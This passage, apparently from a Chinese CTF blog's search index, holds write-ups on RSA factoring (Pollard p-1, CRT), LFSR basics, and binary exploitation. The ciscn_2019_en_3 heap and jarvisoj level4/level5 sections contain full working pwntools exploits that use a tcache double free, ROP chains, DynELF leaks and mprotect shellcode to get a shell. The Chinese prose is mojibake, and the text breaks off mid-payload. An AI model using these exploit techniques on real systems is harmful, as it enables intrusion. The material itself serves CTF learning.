å­pï¼Œä¸”p-1èƒ½è¢«â€œå°â€å› å­æ•´é™¤çš„æƒ…å†µä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–è¯¥æ–¹æ³•æ— æ³•æ­£å¸¸åº”ç”¨ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿ç”¨èµ·æ¥ç›¸å½“ç®€å•ï¼Œæ‰€ä»¥åœ¨é˜²æ­¢å› å¼åˆ†è§£æ”»å‡»æ—¶ï¼Œå¿…é¡»è€ƒè™‘è¿™ä¸€æ–¹æ³•ã€‚\nè€ƒè™‘åœ¨ä¸€ä¸ªæ ‡å‡†çš„rsaä¸­\n$n=p*q$\nè®¾ $x\\equiv1;mod;p$\næ•…æœ‰ p|gcd(x-1,n)\nè€ƒè™‘è´¹é©¬å°å®šç†ï¼Œæœ‰$a^{p-1}\\equiv1;mod;p$ ç°åœ¨æˆ‘ä»¬è€ƒè™‘æ„é€ ä¸€ä¸ª$p-1$çš„å€æ•°\nè‹¥$p-1$æœ‰å¤šä¸ªå°ç´ å› å­ï¼Œä¸”æ¯ä¸€ä¸ªç´ æ•°å¹‚$q|(p-1)$ï¼Œå­˜åœ¨ä¸€ä¸ªæ•°Bä½¿$q\u0026lt;=B$ åˆ™è®¡ç®—$B!$çš„å€¼å³ä¸º$p-1$çš„å€æ•° è€ƒè™‘è´¹é©¬å°å®šç†ï¼Œåˆ™æœ‰$a^{B!}\\equiv;a^{k*(p-1)}\\equiv1;mod;p$\n$a^{B!}\\equiv;a^{k*(p-1)}\\equiv;x;mod;n$\næ¨¡é™¤çš„åˆ†é…å¾‹ï¼š(å‚è€ƒwikiæ¨¡è¿ç®—æ€§è´¨) $$ d;mod;abc\\equiv;(d;mod;a)+a*[(d/a)mod;b]+ab[(d/ a/b)];mod ;c $$\næ•…$x=;(a^{k*(p-1)}mod;p)+p[(x/p);mod;q]=1+k*p$\næ•…è¯¥$x-1$ä¸º$p$çš„å€æ•°\næ•…è®¡ç®—$q=gcd(x-1),n=gcd(kp,qp)$\nå¾—åˆ°qåå¯ä»¥è½»æ¾å¾—åˆ°flag\nexp # # python2 from Crypto.Util.number import sieve_base as primes import gmpy2 n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 t=pow(2,2048) e = 0x10001 k=2 for i in range(10000): k=pow(k,primes[i],n) # æ²¡ä¹˜æ–¹ä¸€æ¬¡æ¨¡ä¸€æ¬¡nå’Œæœ€åå†æ¥æ¨¡nçš„ç»“æœæ˜¯ä¸€æ ·çš„ if(k\u0026gt;t): if(i%15==0): # éšå¿ƒæƒ…å®šæ¯å‡ æ¬¡ååˆ¤æ–­ä¸€æ¬¡ ä¹Ÿå¯ä»¥ä¹˜æ–¹10000æ¬¡åå†åˆ¤æ–­ï¼Œå°±æ€•ç”µè„‘é­ä¸ä½ if(gmpy2.gcd(k-1,n)!=1): # nåªæœ‰qã€pä¸¤ä¸ªå› æ•° print(gmpy2.gcd(k-1,n)) #178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 break p=gmpy2.gcd(k-1,n) q=n//p phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) m=hex(pow(c,d,n))[2:] print(bytes.fromhex(m).decode(\u0026#39;utf-8\u0026#39;)) #NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3} ","date":"2 October 2020","permalink":"/achieve/2019to2021/nctf2019childrsa/","section":"archive","summary":"ä»Šå¤©ç¢°å·§åˆåšäº†ä¸€éè¿™ä¸ªé¢˜,é™¤äº†ä¹‹å‰ç”¨yafuå—¯è§£ï¼Œåˆå»å‚è€ƒäº†ä¸€ä¸‹paperè§£æ³•","title":"[NCTF2019]childRSA"},{"content":"\rç®€å•çš„LFSRæ¨¡å‹ # è¿™æ˜¯ä¸€ä¸ª åº¦ m=3 ã€æ‹¥æœ‰ä¸‰ä¸ªè§¦å‘å™¨çš„LFSR\næœ€å·¦è¾¹çš„çŠ¶æ€ä½æ˜¯åœ¨åé¦ˆè·¯å¾„ä¸­è®¡ç®—å¾—åˆ°çš„\næœ€å³è¾¹çš„ä¸ºè¾“å‡ºä½\nçœ‹åšä¸‹å¼\ndef fun(a,b): return a^b # ï¼ˆa+bï¼‰% 2 while 1: output(s0) t=feedback(s1,s0) s0=s1 s1=s2 s2=t LFSRçš„é€šç”¨å½¢å¼ # åœ¨é€šç”¨å½¢å¼ä¸­åŠ å…¥äº†åé¦ˆç³»æ•° $P$,å®ƒå†³å®šè¯¥åé¦ˆå™¨æ˜¯å¦ä¼šè¢«å¯ç”¨\nè‹¥ $P$ ä¸º 1 åˆ™åé¦ˆæ˜¯æ´»è·ƒçš„ è‹¥ $P$ ä¸º 0 åˆ™åé¦ˆæ˜¯å…³é—­çš„ å‡å®šLFSRçš„åˆå§‹å€¼ä¸º ${S_0},{S_1}\u0026hellip;..{S_{m-1}}$\nåˆ™ä¸‹ä¸€ä¸ªåé¦ˆç³»æ•° $S_m$ å°±è®¡ç®—å¼å¦‚ä¸‹\n${S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\u0026hellip;\u0026hellip;{S_{0}}\\cdot{P_{0}};mod;2$\nå½’çº³å¾—å‡ºæ•´ä¸ªåºåˆ—çš„è®¡ç®—æ–¹æ³•ä¸º\n${S_{i+m}}\\equiv\\sum_{j=0}^{m-1}P_j\\cdot{S_{i+j}};mod;2;;;S_i,P_i\\in{0,1};i=1,2\u0026hellip;.$\nåºåˆ—æœ€å¤§é•¿åº¦ä¸º $2^m-1$\nå‡è®¾å·²çŸ¥ m å’Œéƒ¨åˆ†output æ±‚P # å¦‚æœçŸ¥é“ m çš„èŒƒå›´å¯ä»¥è€ƒè™‘çˆ†ç ´æ¥åš\nå·²çŸ¥ï¼š $$ \\begin{cases} {S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\\cdots{S_{0}}\\cdot{P_{0}};mod;2\\ {S_{m+1}}={S_{m}}\\cdot{P_{m-1}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{1}}\\cdot{P_{0}};mod;2\\ \\vdots\\ {S_{2m-1}}={S_{2m-2}}\\cdot{P_{2m-3}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{m-1}}\\cdot{P_{0}};mod;2\\ \\end{cases} $$\nå»ºç«‹çŸ©é˜µ # $$ \\begin{pmatrix} S_0 \u0026amp; S_1 \u0026amp; S_2 \u0026amp; \\cdots \u0026amp; S_{m-1} \u0026amp; S_{m}\\ S_1 \u0026amp; S_2 \u0026amp; S_3 \u0026amp; \\cdots \u0026amp;S_{m} \u0026amp; S_{m+1}\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\nS_{m-1} \u0026amp; S_{m-2} \u0026amp; S_{m-3} \u0026amp; \\cdots \u0026amp; S_{2m-2} \u0026amp; S_{2m-1} \\end{pmatrix} $$\nåšæ³•å’Œä¸€èˆ¬çŸ©é˜µæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æŠŠåŠ å‡æ³•æ¢æˆå¼‚æˆ–äº†\nç®—å‡ºæ¥çš„å‘é‡ P\n$$ \\begin{pmatrix} P_0\\ P_1\\ \\vdots\\ P_{m-1}\n\\end{pmatrix} $$\nå†ç”¨ P æŠŠåŸæ¨¡å‹æ„é€ å‡ºæ¥\näº†è§£æ•´ä¸ªæ¨¡å‹å°±å¯ä»¥å¾—åˆ°æ•´ä¸ªä¸åŠ å¯†æœ‰å…³çš„åºåˆ—äº†\n","date":"21 August 2020","permalink":"/achieve/2019to2021/lsfr%E5%AD%A6%E4%B9%A0/","section":"archive","summary":"ç®€å•çš„LFSRæ¨¡å‹ # è¿™æ˜¯ä¸€ä¸ª åº¦ m=3 ã€æ‹¥æœ‰ä¸‰ä¸ªè§¦å‘å™¨çš„LFSR","title":"åŸºç¡€LFSR å­¦ä¹ "},{"content":"","date":"18 August 2020","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"\rciscn_2019_en_3 # è¡¥å……ä¸€ä¸‹ double freeçš„åŸç† ï¼šå †ä¸Šçš„æŸå—å†…å­˜è¢«é‡Šæ”¾åï¼Œå¹¶æ²¡æœ‰å°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆæ¸…é›¶ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†å¯¹è¯¥å†…å­˜è¿›è¡Œå†æ¬¡çš„freeï¼Œç”±äºfast binæ˜¯LIFOé˜Ÿåˆ—çš„å•å‘é“¾è¡¨ï¼Œå¯¹åŒä¸€ä¸ªå…ƒç´ freeä¸¤æ¬¡å¯ä»¥ä½¿å…¶å½¢æˆç¯çŠ¶\nå†å¯¹æŒ‡é’ˆè¿›è¡Œä¿®æ”¹ä»è€Œè¾¾åˆ°å¯¹ä»»æ„åœ°å€å†™çš„æ•ˆæœ\ntcache dup å’Œ double freeç±»ä¼¼ï¼Œä½†å°‘äº†å¾ˆå¤šæ£€æµ‹ (è‡³å°‘è¯¥libcæ˜¯è¿™æ ·çš„) å¯ä»¥è½»æ¾ freeä¸¤æ¬¡\ntcacheå…¨åthread local cachingï¼Œå®ƒä¸ºæ¯ä¸ªçº¿ç¨‹åˆ›å»ºä¸€ä¸ªç¼“å­˜,å¯¹æ€§èƒ½æé«˜æœ‰æ˜¾è‘—çš„å¸®åŠ©\n__malloc_hookã€__realloc_hookã€__free_hookã€__memalign_hook å››ä¸ªå…¨å±€å‡½æ•°hookæŒ‡é’ˆã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ malloc è°ƒç”¨çš„æ˜¯ __malloc_hook æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œæ‰€ä»¥ jemalloc æˆ–è€… tcmalloc é€šè¿‡è¦†ç›– __malloc_hook ä½¿ç¨‹åºè°ƒç”¨åˆ°å®ƒä»¬è‡ªå®šä¹‰çš„mallocã€‚\næ€è·¯ # æ³„éœ²libc åˆ©ç”¨tcacheä¿®æ”¹free hook printd_chkå¯ä»¥ç”¨ %p æ¥æ³„éœ²ä¿¡æ¯ä¹Ÿå¯ä»¥åˆ©ç”¨åˆ©ç”¨readåé¢ä¸è¡¥0çš„ç‰¹æ€§ï¼Œè¾“å…¥8ä¸ªå­—ç¬¦æŠŠå­—æ²¾æ»¡ï¼Œæ¥æ³„éœ²æ ˆä¸Šæ•°æ®ï¼Œå¾—åˆ°libc\nexp # from pwn import * context( log_level = \u0026#39;debug\u0026#39;) import sys \u0026#39;\u0026#39;\u0026#39; elf = ELF(\u0026#39;./ciscn_2019_en_3\u0026#39;) libc = elf.libc \u0026#39;/glibc/2.28/64/lib/ld-2.28.so\u0026#39; \u0026#39;\u0026#39;\u0026#39; _libc = \u0026#39;./libc-2.27.so\u0026#39; libc = ELF(_libc) #p = remote(\u0026#34;node3.buuoj.cn\u0026#34;,26720) from pwn import * #p = process([\u0026#39;ld-2.27.so\u0026#39;, \u0026#34;./ciscn_2019_en_3\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:_libc}) p = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26280) def Debug(s): print(s) print(\u0026#39;pid\u0026#39;, proc.pidof(p)) pause() def s2b(s): if type(s) != type(b\u0026#39;1\u0026#39;): return bytes(s, encoding=\u0026#39;utf-8\u0026#39;) else: return s def new(size,s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;story:\u0026#39;,str(size)) p.sendlineafter(\u0026#39;story:\u0026#39;,s) def delete(s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;index:\u0026#39;) p.sendline(s) Debug(\u0026#34;start\u0026#34;) p.recvuntil(\u0026#39;name?\u0026#39;) p.sendline(\u0026#39;%p%p%p\u0026#39;)#name p.recvuntil(\u0026#39;0x200x\u0026#39;) re = (p.recv(12)) a = int(re,16) print(\u0026#39;recv\u0026#39;,hex(a)) #0xf7260 libc_base = a-0x110081 # ç”¨äº†ä¸€ä¸‹åˆé”™è¯¯çš„libcï¼Œæ‡’å¾—è°ƒäº†ã€‚ã€‚ã€‚ç›´æ¥ç›¸å‡ç®—åç§»äº†ã€‚ã€‚ã€‚ print(\u0026#39;libc_base\u0026#39;,hex(libc_base)) free_hook = libc_base + libc.sym[\u0026#39;__free_hook\u0026#39;] sys_add = libc_base + libc.sym[\u0026#39;system\u0026#39;] print(\u0026#34;free_hook\u0026#34;,hex(free_hook)) print(\u0026#34;sys_add_libc\u0026#34;, hex(libc.sym[\u0026#39;system\u0026#39;])) print(\u0026#34;system:\u0026#34;,hex(sys_add)) p.sendline(\u0026#39;1234\u0026#39;) # id new(0x10,b\u0026#39;1234\u0026#39;) # 0 new(0x10,b\u0026#39;/bin/sh\\x00\u0026#39;) # 1 Debug(\u0026#39;new_heap\u0026#39;) delete(b\u0026#39;0\u0026#39;) delete(b\u0026#39;0\u0026#39;) # double freeå½¢æˆç¯ Debug(\u0026#39;free_hook--\u0026gt;debug\u0026#39;) new(0x10,p64(free_hook)) new(0x10,\u0026#39;aa\u0026#39;) new(0x10,p64(sys_add)) # å‘free hookä¸­å†™å…¥system Debug(\u0026#39;del\u0026#39;) delete(b\u0026#39;1\u0026#39;) Debug(\u0026#39;sh\u0026#39;) p.interactive() \u0026#39;\u0026#39;\u0026#39; print(libc.sym[\u0026#39;read\u0026#39;]) Debug(\u0026#39;1\u0026#39;) 0x7f5224771eb3 \u0026#39;\u0026#39;\u0026#39; free hookè¦†ç›–åçš„æƒ…å†µ # è°ƒç”¨free hook # ","date":"18 August 2020","permalink":"/achieve/2019to2021/pwn_heap_818/","section":"archive","summary":"ciscn_2019_en_3 # è¡¥å……ä¸€ä¸‹ double freeçš„åŸç† ï¼šå †ä¸Šçš„æŸå—å†…å­˜è¢«é‡Šæ”¾åï¼Œå¹¶æ²¡æœ‰å°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆæ¸…é›¶ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†å¯¹è¯¥å†…å­˜è¿›è¡Œå†æ¬¡çš„freeï¼Œç”±äºfast binæ˜¯LIFOé˜Ÿåˆ—çš„å•å‘é“¾è¡¨ï¼Œå¯¹åŒä¸€ä¸ªå…ƒç´ freeä¸¤æ¬¡å¯ä»¥ä½¿å…¶å½¢æˆç¯çŠ¶","title":"å‡ ä¸ªå †å…¥é—¨"},{"content":"\rè®°ä¸ªæ¨¡æ¿é¢˜ # é¢˜ç›®ç»™äº†ä»¥ä¸‹æ¡ä»¶ï¼š\n$$\\begin{cases} M^e \\equiv C_1 mod\\;N_1 \\\\[2ex] M^e \\equiv C_2 mod\\;N_2\\quad \\quad (e = 3) \\\\[2ex] M^e \\equiv C_3 mod\\;N_3 \\end{cases} $$\nc1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 å¥—ä¸­å›½å‰©ä½™å®šç†å…¬å¼å°±å¯ä»¥äº†\nimport gmpy2 import binascii from libnum import invmod c1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 _M = n1*n2*n3 m1 = _M//n1 m2 = _M//n2 m3 = _M//n3 t1 = invmod(m1, n1) t2 = invmod(m2, n2) t3 = invmod(m3, n3) _X = (c1*t1*m1 + c2*t2*m2 + c3*t3*m3) % _M a = gmpy2.iroot(_X, 3) print((gmpy2.iroot(_X, 3))) s = hex(949557364767986162692541204888383714648410089749288993554212847615599100096583727459) s = binascii.a2b_hex(s[2:-1]) print(s[::-1]) # cybrics{h3y_guY5_c0m3_t0_my_p4rtY!} å…¶å®ä¸€èˆ¬ç”¨å¾—åˆ°çš„æ˜¯ä¸­å›½å‰©ä½™å®šç†çš„æ‰©å±• =v=\n","date":"26 July 2020","permalink":"/achieve/2019to2021/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/","section":"archive","summary":"","title":"ä¸­å›½å‰©ä½™å®šç†"},{"content":"\rlevle4 # æ²¡æœ‰libcäº†ï¼Œè¦ç”¨ DynELFé…åˆ leak æ¥æ‰¾systemçš„çœŸæ­£åœ°å€\nexp # from pwn import * io=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9880) elf=ELF(\u0026#34;./level4\u0026#34;) input_add = 0x804844B write_plt=elf.plt[\u0026#34;write\u0026#34;] read_plt=elf.plt[\u0026#34;read\u0026#34;] bss_add = 0x0804a024 #0804844B vulnerable_function def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+p32(input_add)+p32(1)+p32(bss_add)+p32(8) io.sendline(payload2) io.sendline(\u0026#34;/bin/sh\u0026#34;) payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+p32(input_add)+p32(bss_add) io.sendline(payload3) io.interactive() def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) è¿™æ˜¯åˆ©ç”¨DynELFæ‰¾systemçš„æ ¸å¿ƒéƒ¨åˆ†leakå‡½æ•°å¯ä»¥è¿”å›åœ°å€å¯¹åº”çš„å€¼ï¼Œè®©DynELFå¯»æ‰¾åˆ°level4çš„åœ°å€é¡µè¿›è€Œæ‰¾åˆ°ä¸€ç³»åˆ—çš„æ‰€éœ€çš„è¡¨\nä½¿ç”¨lookupåœ¨libcæ–‡ä»¶ä¸­æœç´¢systemå‡½æ•°çš„çœŸå®åœ°å€\nhttps://www.freebuf.com/articles/system/193646.html\npayload1= \u0026#39;a\u0026#39;*(0x88+4)+ p32(write_plt)+ p32(input_add)+ p32(1)+ p32(add)+ p32(4) \u0026gt;\u0026gt;\u0026gt; ç­‰ä»·æ‰§è¡Œ write(1,add,8) å¹¶è¿”å› input_add è¿›è¡Œä¸‹ä¸€æ¬¡è¾“å‡ºï¼ˆä¸‹ä¸€æ¬¡pwnï¼‰ payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+ p32(input_add)+ p32(1)+ p32(bss_add)+ p32(8) \u0026gt;\u0026gt;\u0026gt; æ‰§è¡Œread(1,bss_add,8) åœ¨ bss å†™å…¥ /bin/sh payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+ p32(input_add)+ p32(bss_add) æ‰§è¡Œststem(bss_add) level5 # æŒ‰ç…§è¦æ±‚å°è¯•ç”¨mprotectæ¥è§£å†³\nåˆ©ç”¨mprojectä¿®æ”¹.bssä¸­å†…å­˜çš„æƒé™ï¼Œç„¶åå°†shellcodeå†™å…¥.bssæ®µä¸­æ‰§è¡Œå³å¯\nmprotectåŸå‹\nint mprotect(const void *start, size_t len, int prot); è¿™é‡Œéœ€è¦ä¸‰ä¸ªå‚æ•°æ¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œx64ä¼˜å…ˆç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œå…ˆæ‰¾æ‰€éœ€çš„ pop æŒ‡ä»¤\nåªæ‰¾åˆ°äº† rdi rsi æ²¡æœ‰ rdx å€Ÿç”¨__libc_csu_initä¸­çš„æŒ‡ä»¤å®Œæˆ\nexp: # from pwn import * context.arch=\u0026#39;amd64\u0026#39; #p=process(\u0026#39;./l3\u0026#39;) \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54â†“j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36â†‘j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9884) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] read_plt = elf.plt[\u0026#39;read\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] bss = elf.bss() print(\u0026#39;bss=\u0026#39;,hex(bss)) input_add = 0x4005E6 rdi = 0x4006b3 rsi_r15 = 0x4006b1 gadget = 0x4006aa #ç¡®å®šlibcçš„å†…å­˜åŸºå€============================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload1 = 0x88*b\u0026#39;a\u0026#39;+p64(rdi)+p64(1)+p64(rsi_r15)+p64(read_got)+p64(1)+p64(write_plt)+p64(input_add) p.send(payload1) t=u64(p.recv(8)) print((\u0026#39;read_got\u0026#39;,hex(t))) libc.address=t-libc.symbols[\u0026#34;read\u0026#34;] #å†™å…¥mproject ========================================== libc_start_main_got=elf.got[\u0026#39;__libc_start_main\u0026#39;] p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(libc_start_main_got)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload2) mprotect_addr=libc.symbols[\u0026#39;mprotect\u0026#39;] print (hex(mprotect_addr)) p.send(p64(mprotect_addr)) #bsså†™å…¥shellcode=================================================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload3) shellcode=asm(shellcraft.amd64.sh()) print (shellcode) p.send(shellcode) # bssåœ°å€å†™å…¥ gmon_startä¸­============================ p.recvuntil(\u0026#39;Input:\\n\u0026#39;) gmon_start = elf.got[\u0026#39;__gmon_start__\u0026#39;] payload4 = b\u0026#39;a\u0026#39;*(0x88)+p64(rdi)+p64(0x0)+p64(rsi_r15)+p64(gmon_start)+b\u0026#39;deadbeef\u0026#39;+p64(read_plt)+p64(input_add) p.send(payload4) p.send(p64(bss)) #ä¿®æ”¹æƒé™å¹¶æ‰§è¡Œbss=================================================== \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54â†“j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36â†‘j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; add_aa = 0x4006AA add_90 = 0x400690 p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload5 = 0x88*b\u0026#39;a\u0026#39;+p64(add_aa) + p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)+p64(add_90)+p64(0)+p64(0)+p64(1)+p64(gmon_start)+p64(0)+p64(0)+p64(0)+p64(add_90) #payload=b\u0026#39;a\u0026#39;*(offset+8)+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1001)+p64(0x600000)+p64(call_addr)+b\u0026#39;deadbeef\u0026#39;+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)+p64(call_addr) p.send(payload5) p.interactive() payloadåˆ†æ # payload1 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(1)+ p64(rsi_r15)+ p64(write_got)+ p64(1)+ p64(write_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; write(1,write_got,0x200) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(libc_start_main_got)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,libc_start_main_got,0x200) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(bss)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,bss,0x200) payload4 = b\u0026#39;a\u0026#39;*(0x88)+ p64(rdi)+ p64(0x0)+ p64(rsi_r15)+ p64(gmon_start)+ b\u0026#39;deadbeef\u0026#39;+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,gmon_start,0x200) payload5 = 